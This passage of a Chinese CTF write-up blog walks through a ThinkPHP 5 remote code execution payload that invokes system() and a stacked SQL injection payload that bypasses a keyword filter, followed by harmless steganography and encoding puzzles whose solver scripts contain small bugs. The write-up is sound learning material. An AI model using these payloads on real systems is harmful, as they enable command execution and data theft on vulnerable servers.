</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>self</span><span style=color:#f92672>::</span>$debug <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>Log</span><span style=color:#f92672>::</span><span style=color:#a6e22e>record</span>(<span style=color:#e6db74>&#39;[RUN]&#39;</span> <span style=color:#f92672>.</span> $reflect<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>__toString</span>(), <span style=color:#e6db74>&#39;info&#39;</span>);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> $reflect<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>invokeArgs</span>($args);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><pre tabindex=0><code>\think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir
</code></pre><p>接下来设置<code>controller</code>为<code>\think\App</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$controller <span style=color:#f92672>=</span> <span style=color:#a6e22e>strp_tags</span>($result[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>?:</span> $config[<span style=color:#e6db74>&#39;default_controller&#39;</span>]);
</span></span></code></pre></div><p>把<code>result[1]</code>的值传递到<code>$controller</code>中：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>module</span>($result, $config, $convert<span style=color:#f92672>=</span><span style=color:#66d9ef>null</span>)
</span></span></code></pre></div><p>寻找使用<code>module</code>的位置：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>exec</span>($dispatch, $config) {
</span></span><span style=display:flex><span>  <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>  $data <span style=color:#f92672>=</span> <span style=color:#a6e22e>self</span><span style=color:#f92672>::</span><span style=color:#a6e22e>module</span>(
</span></span><span style=display:flex><span>  	$dispatch[<span style=color:#e6db74>&#39;module&#39;</span>],
</span></span><span style=display:flex><span>    $config,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>isset</span>($dispatch[<span style=color:#e6db74>&#39;convert&#39;</span>] <span style=color:#f92672>?</span> $dispatch[<span style=color:#e6db74>&#39;convert&#39;</span>] <span style=color:#f92672>:</span> <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>  );
</span></span><span style=display:flex><span>  <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>$result</code>来自<code>$dispatch['module']</code>，往前看：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>run</span>(<span style=color:#a6e22e>Request</span> $request<span style=color:#f92672>=</span><span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>  <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>  $dispatch <span style=color:#f92672>=</span> <span style=color:#a6e22e>self</span><span style=color:#f92672>::</span><span style=color:#a6e22e>dispatch</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>empty</span>($dispatch)) {
</span></span><span style=display:flex><span>    $dispatch <span style=color:#f92672>=</span> <span style=color:#a6e22e>self</span><span style=color:#f92672>::</span><span style=color:#a6e22e>routeCheck</span>($request, $config);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>  $data <span style=color:#f92672>=</span> <span style=color:#a6e22e>self</span><span style=color:#f92672>::</span><span style=color:#a6e22e>exec</span>($dispatch, $config);
</span></span><span style=display:flex><span>  <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>跟踪<code>routeCheck</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>routeCheck</span>($request, <span style=color:#66d9ef>array</span> $config) {
</span></span><span style=display:flex><span>  <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>result</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Route</span><span style=color:#f92672>::</span><span style=color:#a6e22e>check</span>($request, $path, $depr, $config[<span style=color:#e6db74>&#39;url_domain_deploy&#39;</span>])
</span></span><span style=display:flex><span>  <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>发现解析URL并未进行安全检测。</p><p>从<code>Request::path()</code>跟踪到<code>pathinfo()</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>pathinfo</span>() {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_null</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>pathinfo</span>)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#a6e22e>Config</span><span style=color:#f92672>::</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;var_pathinfo&#39;</span>)])) {
</span></span><span style=display:flex><span>      <span style=color:#75715e>// 判断URL是否含有兼容模式参数
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      $_SERVER[<span style=color:#e6db74>&#39;PATH_INFO&#39;</span>] <span style=color:#f92672>=</span> $_GET[<span style=color:#a6e22e>Config</span><span style=color:#f92672>::</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;var_pathinfo&#39;</span>)];
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>unset</span>($_GET[<span style=color:#a6e22e>Config</span><span style=color:#f92672>::</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;var_pathinfo&#39;</span>)]);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>elseif</span> (<span style=color:#a6e22e>IS_CLI</span>) {
</span></span><span style=display:flex><span>      <span style=color:#75715e>// CLI模式下 index.php module/controller/action/params/...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      $_SERVER[<span style=color:#e6db74>&#39;PATH_INFO&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>isset</span>($_SERVER[<span style=color:#e6db74>&#39;argv&#39;</span>][<span style=color:#ae81ff>1</span>]) <span style=color:#f92672>?</span> $_SERVER[<span style=color:#e6db74>&#39;argv&#39;</span>][<span style=color:#ae81ff>1</span>] <span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 分析 PATHINFO 信息
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SERVER[<span style=color:#e6db74>&#39;PATH_INFO&#39;</span>])) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>foreach</span> (<span style=color:#a6e22e>Config</span><span style=color:#f92672>::</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;pathinfo_fetch&#39;</span>) <span style=color:#66d9ef>as</span> $type) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_SERVER[$type])) {
</span></span><span style=display:flex><span>          $_SERVER[<span style=color:#e6db74>&#39;PATH_INFO&#39;</span>] <span style=color:#f92672>=</span> (<span style=color:#ae81ff>0</span> <span style=color:#f92672>==</span> <span style=color:#a6e22e>strops</span>($_SERVER[$type], $_SERVER[<span style=color:#e6db74>&#39;SCRIP_NAME&#39;</span>])) <span style=color:#f92672>?</span> <span style=color:#a6e22e>substr</span>($_SERVER[$type], <span style=color:#a6e22e>strlen</span>($_SERVER[<span style=color:#e6db74>&#39;SCRIPT_NAME&#39;</span>])) <span style=color:#f92672>:</span> $_SERVER[$type];
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>pathinfo</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>empty</span>($_SERVER[<span style=color:#e6db74>&#39;PATH_INFO&#39;</span>]) <span style=color:#f92672>?</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>:</span> <span style=color:#a6e22e>ltrim</span>($_SERVER[<span style=color:#e6db74>&#39;PATH_INFO&#39;</span>], <span style=color:#e6db74>&#39;/&#39;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>pathinfo</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>var_info</code>默认配置为<code>s</code>，可以通过<code>$_GET['s']</code>进行传参</p><p>构造<code>payload</code>：</p><pre tabindex=0><code>?s=index/\think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir
</code></pre><p>获得<code>flag</code>。</p><h3 id=supersqli>supersqli<a hidden class=anchor aria-hidden=true href=#supersqli>#</a></h3><blockquote><p>Des：随便注。</p></blockquote><p>看源码。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>title</span>&gt;easy_sql&lt;/<span style=color:#f92672>title</span>&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>h1</span>&gt;
</span></span><span style=display:flex><span>            取材于某次真实环境渗透，只说一句话:开发和安全缺一不可
</span></span><span style=display:flex><span>        &lt;/<span style=color:#f92672>h1</span>&gt;
</span></span><span style=display:flex><span>        <span style=color:#75715e>&lt;!-- sqlmap是没有灵魂的 --&gt;</span>
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;get&#34;</span>&gt;
</span></span><span style=display:flex><span>            姿势:&lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;inject&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1&#34;</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>&lt;/</span><span style=color:#a6e22e>form</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>pre</span>&gt;&lt;/<span style=color:#f92672>pre</span>&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></div><p>有过滤。</p><p>可以堆叠注入。</p><p><code>flag</code>在<code>1919810931114514</code>这个表里面。查询表数据的方法有两种:1.页面默认查询的是<code>words</code>表，需要将这两个表名互换；2.利用<code>MySQL</code>的预处理进行查询。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;;use supersql;set @sql=concat(&#39;</span>s<span style=color:#e6db74>&#39;, &#39;</span>elect <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> <span style=color:#f92672>`</span><span style=color:#ae81ff>1919810931114514</span><span style=color:#f92672>`</span><span style=color:#e6db74>&#39;);PREPARE pre FROM @sql;EXECUTE pre;--+
</span></span></span></code></pre></div><p>知识点：</p><p>1.<code>MySQL</code>表名为纯数字(或表名和保留字冲突时)，要加反引号，如：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>show</span> columns <span style=color:#66d9ef>from</span> <span style=color:#f92672>`</span><span style=color:#ae81ff>1919810931114514</span><span style=color:#f92672>`</span>
</span></span></code></pre></div><p>2.<code>MySQL</code>官方将<code>prepare</code>、<code>execute</code>、<code>deallocate</code>统称为预处理语句。</p><p>3.字符拼接函数可以绕过关键字检查，如这里利用的<code>concat</code>。</p><h2 id=misc>Misc<a hidden class=anchor aria-hidden=true href=#misc>#</a></h2><h3 id=reverseme>reverseMe<a hidden class=anchor aria-hidden=true href=#reverseme>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><p>给了一张图片:</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/uPic/wTJRqF-20220820105745512.jpg alt=wTJRqF.jpg></p><p>放进<code>ps</code>翻转图片即可。</p><p>获得<code>flag</code>。</p><h3 id=this_is_flag>this_is_flag<a hidden class=anchor aria-hidden=true href=#this_is_flag>#</a></h3><blockquote><p>Des：Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}。</p></blockquote><p>获得<code>flag</code>。</p><h3 id=pdf>pdf<a hidden class=anchor aria-hidden=true href=#pdf>#</a></h3><blockquote><p>Des：菜猫给了菜狗一张图，说图下面什么都没有。</p></blockquote><p>给了一个<code>pdf</code>文件，用<code>binwalk</code>看看。</p><p>啥也没有，再用<code>Acrobat</code>软件查看<code>pdf</code>。</p><p>诶，发现图片后面还有一个文本框，尝试把图片拖到一旁。</p><p>获得<code>flag</code>。</p><h3 id=give_you_flag>give_you_flag<a hidden class=anchor aria-hidden=true href=#give_you_flag>#</a></h3><blockquote><p>Des：菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包。</p></blockquote><p>给了一个<code>gif</code>图片，查看后发现最后一针有一个二维码，用<code>StegSolve</code>逐帧看看。</p><p>得到这一帧图片，发现缺少二维码定位点，尝试自己画上去。</p><p>扫描二维码。</p><p>获得<code>flag</code>。</p><h3 id=gif>gif<a hidden class=anchor aria-hidden=true href=#gif>#</a></h3><blockquote><p>Des：菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机。</p></blockquote><p>解压压缩包后获得104张图片，只有黑白两种颜色，猜测分别表示1和0？</p><p><code>01100110 01101100 01100001 01100111 01111011 01000110 01110101 01001110 01011111 01100111 01101001 01000110 01111101</code></p><p>然后通过<code>python</code>脚本转换一下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>x <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0b01100110</span>, <span style=color:#ae81ff>0b01101100</span>, <span style=color:#ae81ff>0b01100001</span>, <span style=color:#ae81ff>0b01100111</span>, <span style=color:#ae81ff>0b01111011</span>, <span style=color:#ae81ff>0b01000110</span>, <span style=color:#ae81ff>0b01110101</span>, <span style=color:#ae81ff>0b01001110</span>, <span style=color:#ae81ff>0b01011111</span>, <span style=color:#ae81ff>0b01100111</span>, <span style=color:#ae81ff>0b01101001</span>, <span style=color:#ae81ff>0b01000110</span>, <span style=color:#ae81ff>0b01111101</span>]
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> x:
</span></span><span style=display:flex><span>  flag <span style=color:#f92672>+=</span> chr(i)
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><p>获得<code>flag</code>。</p><h3 id=掀桌子>掀桌子<a hidden class=anchor aria-hidden=true href=#掀桌子>#</a></h3><blockquote><p>Des：菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻。</p></blockquote><p>分析给出的字符串，由<code>0-9</code>，<code>a-f</code>组成，两两分组转换成字节后均大于<code>128</code>，而<code>ASCII</code>码范围为<code>0-127</code>，将其减去<code>128</code>，<code>python</code>代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>x <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xc8\xe9\xac\xa0\xc6\xf2\xe5\xf3\xe8\xc4\xef\xe7\xa1\xa0\xd4\xe8\xe5\xa0\xe6\xec\xe1\xe7\xa0\xe9\xf3\xba\xa0\xe8\xea\xfa\xe3\xf9\xe4\xea\xfa\xe2\xea\xe4\xe3\xea\xeb\xfa\xeb\xe3\xf5\xe7\xe9\xf3\xe4\xe3\xe8\xea\xf9\xea\xf3\xe2\xe4\xe6\xf2</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>falg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> x:
</span></span><span style=display:flex><span>  flag <span style=color:#f92672>+=</span> chr(ord(i)<span style=color:#f92672>-</span><span style=color:#ae81ff>128</span>)
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><p>获得<code>flag</code>。</p><h3 id=如来十三掌>如来十三掌<a hidden class=anchor aria-hidden=true href=#如来十三掌>#</a></h3><blockquote><p>Des：菜狗为了打败菜猫，学了一套如来十三掌。</p></blockquote><p>给了一个<code>docx</code>文档，用<code>binwalk</code>查看一下信息。</p><p>使用命令<code>binwalk -e</code>分离文件。</p><p>然后再怎么找也找不到路子做题，看了下<code>wp</code>，佛了。</p><p>要用到<a href=http://www.keyfc.net/bbs/tools/tudoucode.aspx>与佛论禅</a>进行解密。</p><p>获得一串字符串，有点像<code>Base64</code>，但是解码后是乱码，想想题目，十三，尝试一下<code>rot13</code>。</p><p>然后再进行<code>Base64解码</code>。</p><p>获得<code>flag</code>。</p><h3 id=simplerar>SimpleRAR<a hidden class=anchor aria-hidden=true href=#simplerar>#</a></h3><blockquote><p>Des：菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)。</p></blockquote><p>只给了文件<code>flag.txt</code>。</p><p>可是除了这个文件啥也没有了呀&mldr;</p><p>用<code>WinRAR</code>打开压缩包试试（别问为什么，问就是套路）。</p><p>上<code>WinHex</code>查看数据。</p><p><code>here</code>之后的数据应该就是那张图片了，搜索一下rar每个块的文件头：<code>0x74</code>。</p><p>将高亮处改为<code>74</code>，保存。图片出来了。</p><p>一片纯白，按提示用<code>ps</code>查看图层，但显示打开错误&mldr;用<code>binwalk</code>看看这是什么。</p><p>改后缀为<code>.gif</code>，再尝试打开。</p><p>只有两个空白图层，将它们分别保存后用<code>StegSolve</code>看看。</p><p>图层1。</p><p>图层2。</p><p>两张被分割的二维码，没有定位符&mldr;</p><p>唉，拼接吧。本来想用<code>ps</code>的图层，然而学艺不精，丢在<code>word</code>里面拼接之后，再用画图工具弄上定位符。</p><p>获得<code>flag</code>。</p><h3 id=坚持60s>坚持60s<a hidden class=anchor aria-hidden=true href=#坚持60s>#</a></h3><blockquote><p>Des：菜狗发现最近菜猫不爱理他，反而迷上了菜鸡。</p></blockquote><p>这&mldr;之前做过。</p><p>使用命令<code>binwalk -e</code>分离文件出来，然后切换到分离目录，<code>grep -r "flag"</code>。</p><p>用记事本打开包含<code>flag</code>的文档，搜索<code>flag</code>。</p><p>里面的内容是<code>Base64</code>编码，解码后进行提交。</p><p>获得<code>flag</code>。</p><h3 id=base64stego>base64stego<a hidden class=anchor aria-hidden=true href=#base64stego>#</a></h3><blockquote><p>Des：菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓。</p></blockquote><p>题目给的压缩包里有一个加密文件，但是没有密码提示，用<code>WinHex</code>打开压缩包看看。</p><p>伪加密，将高亮处改为<code>00</code>，保存。</p><p>正常打开<code>stego.txt</code>，一大段<code>Base64</code>编码。</p><p>进行<code>Base64</code>解码，获得一串无用字符串<code>Steganography is the art and science of writing hidden messages in such a way that no one</code>。</p><p>是一道<code>Base64</code>隐写，附上<code>python2.7</code>脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_base64_diff_value</span>(s1, s2):
</span></span><span style=display:flex><span>  base64chars <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/&#39;</span>
</span></span><span style=display:flex><span>  res <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> xrange(len(s1)):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> s1[i] <span style=color:#f92672>!=</span> s2[i]:
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> abs(base64chars<span style=color:#f92672>.</span>index(s1[i]) <span style=color:#f92672>-</span> base64chars<span style=color:#f92672>.</span>index(s2[i]))
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> res
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve_stego</span>():
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;stego.txt&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    file_lines <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>  bin_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> file_lines:
</span></span><span style=display:flex><span>    steg_line <span style=color:#f92672>=</span> line<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>    norm_line <span style=color:#f92672>=</span> line<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;base64&#39;</span>)<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;base64&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>    diff <span style=color:#f92672>=</span> get_base64_diff_value(steg_line, norm_line)
</span></span><span style=display:flex><span>    pads_num <span style=color:#f92672>=</span> steg_line<span style=color:#f92672>.</span>count(<span style=color:#e6db74>&#39;=&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> diff:
</span></span><span style=display:flex><span>      bin_str <span style=color:#f92672>+=</span> bin(diff)[<span style=color:#ae81ff>2</span>:]<span style=color:#f92672>.</span>zfill(pads_num<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>      bin_str <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#39;0&#39;</span><span style=color:#f92672>*</span>pads_num<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>  res_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>0</span>, len(bin_str), <span style=color:#ae81ff>8</span>):
</span></span><span style=display:flex><span>    res_str <span style=color:#f92672>+=</span> chr(int(bin_str[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>], <span style=color:#ae81ff>2</span>))
</span></span><span style=display:flex><span>  print res_str
</span></span><span style=display:flex><span>solve_stego()
</span></span></code></pre></div><p>获得<code>flag</code>。</p><h3 id=ext3>ext3<a hidden class=anchor aria-hidden=true href=#ext3>#</a></h3><blockquote><p>Des：今天是菜狗的生日，他收到了一个Linux系统光盘。</p></blockquote><p>给了一个<code>ext</code>文件，是<code>Linux</code>系统文件，尝试挂载一下。此处的<code>wsl kali</code>由于配置环境不够，使用<code>VMware kali</code>虚拟机进行操作。</p><p>挂载：<code>mount f1fc23f5c743425d9e0073887c846d23 /mnt/</code>。</p><p>查找：<code>find 'flag' /mnt/</code>，发现有一个<code>/mnt/O7avZhikgKgbF/flag.txt</code>文件。</p><p>查看：<code>cat /mnt/O7avZhikgKgbF/flag.txt</code>。</p><p><code>Base64</code>解码。</p><p>获得<code>flag</code>。</p><h3 id=stegano>stegano<a hidden class=anchor aria-hidden=true href=#stegano>#</a></h3><blockquote><p>Des：菜狗收到了图后很开心，玩起了pdf提交格式为flag{xxx}，解密字符需小写。</p></blockquote><p>题目给了一个<code>pdf</code>文件，使用浏览器打开，<code>Ctrl+A</code>选中所有，将文本复制到记事本。</p><p>没有规律，尝试摩斯密码，将A替换为<code>.</code>，B替换为<code>-</code>，<code>python</code>代码附上：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB&#39;</span>
</span></span><span style=display:flex><span>s1 <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#e6db74>&#39;.&#39;</span>)
</span></span><span style=display:flex><span>s2 <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;B&#39;</span>, <span style=color:#e6db74>&#39;-&#39;</span>)
</span></span><span style=display:flex><span>print(s2)
</span></span></code></pre></div><p>得到一串摩斯加密，<a href=http://www.zhongguosou.com/zonghe/moersicodeconverter.aspx>摩尔斯电码转换器：在线进行摩尔斯电码和英文字母的相互转换，可以把莫尔斯电码转换为英文字母，也可把英文字母转换为摩尔斯电码 (zhongguosou.com)</a>，因为其他网站不是解不出来就是乱码&mldr;然后对得到的字符串进行小写处理，<code>python</code>脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;FLAG1NV151BL3M3554G3&#39;</span>
</span></span><span style=display:flex><span>print(s<span style=color:#f92672>.</span>lower())
